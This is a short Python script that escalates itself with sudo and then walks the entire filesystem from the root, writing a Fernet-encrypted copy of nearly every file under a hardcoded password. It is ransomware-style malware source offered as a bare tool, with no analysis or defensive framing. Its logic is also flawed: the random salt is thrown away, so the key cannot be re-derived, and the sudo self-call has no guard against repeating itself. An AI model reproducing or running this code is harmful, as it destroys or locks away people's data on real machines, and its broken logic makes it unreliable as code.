#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
import base64
import subprocess

def derive_key(password):
    salt = os.urandom(16)
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        iterations=100000,
        salt=salt,
        length=32,
        backend=default_backend()
    )
    key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
    return Fernet(key)

def encrypt_file(file_path, key):
    with open(file_path, "rb") as file:
        contents = file.read()
    cipher = key
    encrypted_contents = cipher.encrypt(contents)
    with open(file_path + ".encrypted", "wb") as file:
        file.write(encrypted_contents)

password = "passkey"
key = derive_key(password)
exclude = ['/dev', '/proc', '/sys', '/boot', '/etc']

sudo_command = ["sudo", "python3", __file__]
subprocess.call(sudo_command)

for root, dirs, files in os.walk("/"):
    dirs[:] = [d for d in dirs if os.path.join(root, d) not in exclude]

    for file in files:
        if file == "encrypt.py" or file == "decrypt.py":
            continue
        file_path = os.path.join(root, file)
        encrypt_file(file_path, key)

print("Files Encrypted Successfully")
